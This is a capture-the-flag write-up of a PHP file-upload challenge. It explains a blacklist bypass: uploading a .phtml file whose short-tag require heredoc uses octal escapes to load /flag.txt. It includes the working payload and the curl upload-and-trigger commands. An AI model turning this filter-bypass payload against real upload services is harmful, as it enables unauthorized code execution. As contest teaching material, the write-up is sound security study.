# Simple Hack

**Point: 410**

We developed a file upload platform. I think it is really secure. Isn't it?

http://chal.thjcc.org:5222/

## Summary

The challenge is a file upload service with a blacklist-based upload filter.  
The bug chain is:

1. Upload allows `.phtml` files.
2. `sandbox.php?f=...` executes uploaded `.phtml` via PHP include behavior.
3. Blacklist blocks many obvious payload strings, but `require` + heredoc + octal escapes bypasses it.
4. Use this to load `/flag.txt`.

## Recon

Uploading a normal text file returns:

`/?status=success&file=%2Fsandbox.php%3Ff%3Da.txt`

So uploaded files are accessed through `sandbox.php?f=<filename>`.

Useful behavior observed:

- `f[]=a.txt` causes PHP type error and leaks backend file path (`/var/www/sandbox.php`).
- `.php` upload is blocked.
- `.phtml` upload is allowed.
- Accessing uploaded `.phtml` through `sandbox.php` executes PHP code.

## Filter bypass idea

Direct payloads like:

- `<?php ... ?>`
- `include(...)`
- direct `flag` string

are blocked.

Bypass approach:

- Use short open tag: `<? ... ?>`
- Use `require` (allowed)
- Use heredoc (no quotes needed)
- Encode `/flag.txt` as octal escapes so blacklist does not match `flag`

`/flag.txt` in octal escaped form:

`/\146\154\141\147\056\164\170\164`

## Final exploit

Create payload file:

```php
<?require<<<A
/\146\154\141\147\056\164\170\164
A;
?>
```

Upload and trigger:

```bash
cat > solve.phtml << 'EOF'
<?require<<<A
/\146\154\141\147\056\164\170\164
A;
?>
EOF

curl -s -c cookie.txt -b cookie.txt \
  -F "file=@solve.phtml;filename=x1.phtml;type=text/plain" \
  "http://chal.thjcc.org:5222/" > /dev/null

curl -s -b cookie.txt "http://chal.thjcc.org:5222/sandbox.php?f=x1.phtml"
```

## Flag

`THJCC{w311_d0n3_y0u_byp4553d_7h3_b14ck1157_:D}`
